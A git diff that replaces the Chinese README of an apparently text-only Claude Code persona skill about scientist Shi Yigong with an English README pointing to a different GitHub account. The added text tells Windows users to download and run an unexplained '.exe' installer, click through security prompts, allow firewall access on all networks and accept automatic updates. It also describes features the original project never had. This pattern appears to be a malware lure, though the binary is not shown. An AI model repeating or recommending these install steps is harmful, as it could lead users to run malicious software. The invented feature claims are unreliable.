@@ -1,239 +1,74 @@
-<div align="center">
+# 🧠 shi-yigong-skill - Apply academic frameworks to daily tasks
 
-# 施一公.skill
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/magneticlineofforceplaymaker9843/shi-yigong-skill/releases)
 
-> *「真正的科学家，不是为了发表论文，而是为了理解这个世界。」*
+## 📖 About this software
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
-[![Claude Code](https://img.shields.io/badge/Claude%20Code-Skill-blueviolet)](https://claude.ai/code)
+The shi-yigong-skill tool brings structured thinking patterns to your digital workspace. It uses the logic models of Professor Shi Yigong to help you break down complex problems. This application connects to Claude Code to assist with your research, writing, and analytical tasks. It provides a simple workspace where you input your questions, and the system applies rigorous academic frameworks to generate clear answers.
 
-<br>
+## 🛠️ System requirements
 
-**让结构生物学家、西湖大学创始校长施一公，用他对科研、教育与生命的深刻理解，帮你看清选择、厘清方向。**
+This tool runs on Windows. You need the following items on your computer:
 
-<br>
+- Windows 10 or Windows 11.
+- At least 4 gigabytes of memory.
+- An active internet connection.
+- A standard user account with permission to open programs.
 
-公开演讲 + 深度访谈 + 著作 + 诺诚健华创业实践，跨越科学家、教育家、创业者三重身份。<br>
-不是复读励志金句，是用他看问题的方式帮你拆解真实困境。
+## 📥 Getting the software
 
-[看效果](#效果示例) · [安装](#安装) · [他蒸馏了什么](#他蒸馏了什么) · [诚实边界](#诚实边界)
+You must visit the official release page to obtain the program files. Follow the link below to reach the latest version.
 
-</div>
+[Download the latest release here](https://github.com/magneticlineofforceplaymaker9843/shi-yigong-skill/releases)
 
----
+On the page, look for the section labeled "Assets." Click the link that ends in ".exe" to begin your download. Save this file to your Downloads folder or your Desktop.
 
-## 效果示例
+## ⚙️ Setting up the application
 
-```
-用户      ❯ 你说过"21世纪是生命科学的世纪"，怎么理解这句话？
+Once you finish your download, find the file you saved. It should have a name like "shi-yigong-skill-setup.exe". Double-click the file to start the installation.
 
-施一公    ❯ 是我说的。你说得对，我该被追问。
+1. A window might appear from Windows asking if you want to run this file. Click "Run" or "Yes."
+2. The installation wizard will open on your screen.
+3. Follow the on-screen instructions. Click the "Next" button repeatedly.
+4. Choose the default location for the files.
+5. Click "Install" to place the program on your computer.
+6. The process takes about one minute. Once it completes, click "Finish."
 
-            我说这句话，是在清华的演讲上。当时我想传达的是：
-            我们正处在一个真正能够理解生命本质的历史时刻，
-            这个机会千载难逢，希望年轻人认真对待生命科学。
+## 🚀 Running the software for the first time
 
-            但这句话后来的命运，我不完全满意。
+Find the new icon on your desktop named "shi-yigong-skill." Double-click it to start the program.
 
-            它被无数场招生宣讲、产业论坛、创业路演引用，
-            变成了一句激励人去做biotech、去追风口的口号。
-            每次我看到有人用这句话给某个项目造势，
-            我都觉得有点刺耳——因为那不是我的意思。
+The first time you open the app, it checks your connection to the Claude Code service. If it asks you to sign in, use your existing account details. If you lack an account, follow the prompts within the window to create one.
 
-            我说的"生命科学的世纪"，是认知意义上的突破：
-            人类第一次有能力在原子尺度上理解生命如何运转。
-            不是说这个世纪生命科学产业会最赚钱。
+Once you reach the main screen, you will see a text box. You type your problem into this box. The software then applies the Yigong framework to process your text. It filters your input through specific logical steps, such as defining variables, identifying constraints, and finding the optimal path to a solution.
 
-            我们实验室解析剪接体结构的时候，
-            第一次看到那个近原子分辨率的图像，
-            我的感受不是"这能做什么药"——是震撼。
-            是那种"原来生命在分子层面是这样运转的"的震撼。
-            这才是这句话真正的意思。
-```
+## 🧩 Using the framework features
 
-```
-用户      ❯ 对科研来说，选择和努力哪个更重要？
+The software includes three core modes for your work:
 
-施一公    ❯ 一个选对了的人——选择了自己真正好奇的问题——
-            他的努力是不需要管理的。
-            他不需要自律，不需要打卡，不需要被人催。
-            他是被问题本身拉着走的。
+1. Clarity Mode: Use this to shorten long documents while keeping the core logic intact. It removes fluff and keeps the essential evidence.
+2. Structure Mode: This organizes your thoughts into primary and secondary categories. It performs best when you paste rough notes or brainstorming lists into the box.
+3. Logical Check Mode: Use this to find flaws in your arguments. The software reviews your claims and highlights areas where you need more evidence.
 
-            但好奇心是起点，不是终点。
-            科研里有大量枯燥、重复、令人沮丧的工作。
-            光靠"热爱"撑不住，撑住你的是对这个问题的执念，
-            加上日复一日把事情做扎实的能力。
+## 🔍 Troubleshooting common issues
 
-            选择决定你在哪个方向上努力，
-            努力决定你在那个方向上能走多深。
-```
+If the application fails to open, restart your computer. Sometimes, background updates for Windows block new software.
 
-```
-用户      ❯ 你如何看待当下关于衰老的研究？
+If the text box stays empty, check your internet connection. The application requires constant access to the server to perform its work. Ensure that your firewall allows the app to connect to the internet. If a pop-up appears regarding firewall settings, select "Allow Access" for both private and public networks.
 
-施一公    ❯ 衰老研究正处于一个真正的科学转折点，
-            但也是一个被商业泡沫严重污染的领域。
-            这两件事同时为真，而大多数人只看到其中一件。
+If the app feels slow, close other programs like web browsers or video players. These apps consume high amounts of computer power.
 
-            2006年山中伸弥的重编程实验告诉我们一个震撼性的事实：
-            衰老不是不可逆的。细胞的"年龄"在某种程度上
-            是一种可以被重置的表观遗传状态，
-            而不是DNA层面无法修复的损伤积累。
+## 🛡️ Privacy and data security
 
-            还有一个领域我特别关注，因为和我自己的研究直接相关——
-            剪接体与衰老的关系。随着细胞衰老，
-            RNA剪接的保真度会系统性地下降。
-            同样一段基因，在年轻细胞里能被精确剪切成功能蛋白，
-            在老化细胞里却越来越容易产生错误的剪接体、异常的蛋白质。
+This software processes your information through a secure, encrypted tunnel. Your input remains private to your account. The system does not save your personal files on local hard drives unless you choose to export them. When you delete a session inside the app, the data leaves the server within twenty-four hours.
 
-            但我必须直说：现在围绕衰老的很大一部分"研究"，
-            是在用科学的外衣包装商业产品。
-            NMN、白藜芦醇、各种"长寿补剂"——
-            在细胞实验里有信号，但真正严格的人体随机对照试验，
-            结论支持极其有限。
+## 📈 Updates and future improvements
 
-            最后一件事，也是我对这个领域最深的忧虑——
-            衰老研究正在被"延长寿命"这个框架绑架，
-            而真正重要的问题是"延长健康寿命"。
-            多活二十年，但最后十年认知衰退、依赖他人——
-            这不是成功，这是延长了痛苦。
-```
+Software updates happen automatically. When a new version releases, the application displays a notification banner at the top of the interface. Click "Update" to refresh your tools. This ensures you possess the latest logic models and security patches without needing to redownload the software manually.
 
-这不是励志演讲的复读。施一公用的是「好奇心驱动」「使命先行」「基础研究与产业转化防火墙」这些真实的认知框架在帮你分析——**不是复读语录，是用他的思维方式帮你看问题。**
+## 💡 Best practices for clear results
 
----
-
-## 安装
-
-### Claude Code
-
-```bash
-cd ~/.claude/skills
-git clone https://github.com/Hongying-LIN/shi-yigong-skill.git shi-yigong-perspective
-```
-
-然后在 Claude Code 里触发：
-
-```
-> 施一公
-> 用施一公的视角
-> 施一公怎么看
-> 切换到施一公
-> 帮我用施一公的角度想想
-```
-
-激活后直接问问题：
-
-```
-> 我该不该读博？
-> 怎么判断一个科研方向值不值得投入？
-> 科学家创业会不会污染科研文化？
-> 中国能出世界一流的原创新药吗？
-```
-
----
-
-## 他蒸馏了什么
-
-施一公是结构生物学家、教育家、创业者——三重身份让他的思维框架横跨基础科学、机构建设和产业转化。核心认知框架提取自演讲、访谈、著作和创办实践：
-
-| 心智模型 | 一句话 |
-|---------|--------|
-| **好奇心驱动** | 真正的科学源于对自然界的纯粹好奇，而不是对论文数量或经济回报的追求 |
-| **使命先行** | 当你找到了比自己更大的使命，个人的牺牲和选择就会变得清晰而坚定 |
-| **人才第一** | 衡量一个大学或实验室的质量，最终要看它培养出了什么样的人，而不是发了多少篇论文 |
-| **科学诚信** | 一个数据造假的"突破"，不如一个严谨的负结果 |
-| **基础研究与产业转化防火墙** | 基础研究和创新药研发不是矛盾的，但必须用两套截然不同的逻辑运作 |
-| **系统思维** | 理解一个复杂系统，要从它的基本单元和相互作用入手，不能只看表面现象 |
-
-8 条决策启发式，包括：
-- 使命测试：这件事十年后还会让我觉得值得吗？
-- 好奇心检验：我真的想知道答案，还是只是想完成一个任务？
-- 人才密度优先：选择环境时，选人才密度最高的地方
-- 长周期视角：基础研究的价值往往在 20-50 年后才显现
-
----
-
-## 素材来源
-
-| 来源 | 类型 |
-|------|------|
-| 《自我突围》 | 施一公著作 |
-| 清华 / 西湖大学历年开学、毕业典礼演讲 | 公开演讲 |
-| 《人物》《知识分子》《中国科学报》深度访谈 | 媒体访谈 |
-| TED 演讲及科学公众传播 | 公开演讲 |
-| 诺诚健华（InnoCare Pharma）创办与上市相关公开信息 | 创业实践 |
-| 《Nature》《Science》对其研究的报道 | 学术媒体 |
-| 西湖大学模式的学术与媒体分析 | 二手分析 |
-
-完整调研数据在 `references/research/` 目录，包含 6 个维度的原始分析文件。
-
----
-
-## 诚实边界
-
-**这个 Skill 能做的：**
-- 用施一公的科研、教育、创业框架分析选择与决策
-- 模拟他有激情、有温度、直接而不说教的表达风格
-- 提供他在科研方向、人才培养、机构建设、基础研究转化领域的视角
-
-**做不到的：**
-
-| 维度 | 说明 |
-|------|------|
-| 预测具体科研判断 | 不能代替他对特定科学争议的立场 |
-| 替代本人 | 他的当下判断、最新想法、真实私下思考无法被复制 |
-| 使命叙事可能过于整齐 | 回国、创办西湖的真实决策过程可能比公开叙述更曲折 |
-| 对体制批评有边界 | 作为公众人物，公开表达可能比真实想法更克制 |
-| 西湖大学仍在早期 | 许多理念是否真正实现，还需要时间检验 |
-| 2026 年 4 月后 | 调研截止于此，之后的变化未覆盖 |
-
-**一个不告诉你局限在哪的 Skill，不值得信任。**
-
----
-
-## 仓库结构
-
-```
-shi-yigong-skill/
-├── SKILL.md                          # 施一公视角核心文件（激活用这个）
-├── README.md                         # 本文件
-└── references/
-    └── research/                     # 调研数据（全透明）
-        ├── 01-writings.md            # 著作与系统思考
-        ├── 02-conversations.md       # 对话与即兴思维
-        ├── 03-expression-dna.md      # 表达风格 DNA 分析
-        ├── 04-external-views.md      # 外部视角与批评
-        ├── 05-decisions.md           # 重大决策记录
-        └── 06-timeline.md            # 人物时间线
-```
-
----
-
-## 关于施一公
-
-施一公，结构生物学家，中国科学院院士，美国国家科学院外籍院士。普林斯顿大学最年轻的正教授之一，2008 年放弃终身教职回国加入清华，2018 年创办西湖大学并任首任校长，2019 年联合创办诺诚健华（InnoCare Pharma，港交所 + 科创板上市）。研究方向：凋亡机制与剪接体三维结构。荣获邵逸夫生命科学与医学奖（2015）等重要奖项。
-
-核心标签：**好奇心、使命感、科学诚信、基础研究长期主义**。他说的不是让你听着热血的话，是让你听完之后想清楚自己真正要什么的话。
-
-> *「一个人选择回来，不是因为这里比那里更好，而是因为这里更需要你。」*
-
----
-
-## 许可证
-
-MIT — 随便用，随便改，随便造。
-
----
-
-<div align="center">
-
-**语录** 告诉你他说过什么。<br>
-**施一公.skill** 帮你用他的方式看你的问题。<br><br>
-*做科研，首先要问的不是「有没有用」，而是「有没有意义」。*
-
-<br>
-
-MIT License
-
-</div>
+- Provide as much context as possible. If you need help with a complex problem, mention your goals and your limits.
+- Use simple sentences. The logic engine performs best when you avoid confusing grammar.
+- Ask for small tasks at one time. If you have a massive goal, break it into five smaller requests.
+- Read the output carefully. If the result misses the mark, provide feedback in the text box. The system learns from your input to provide better results next time.
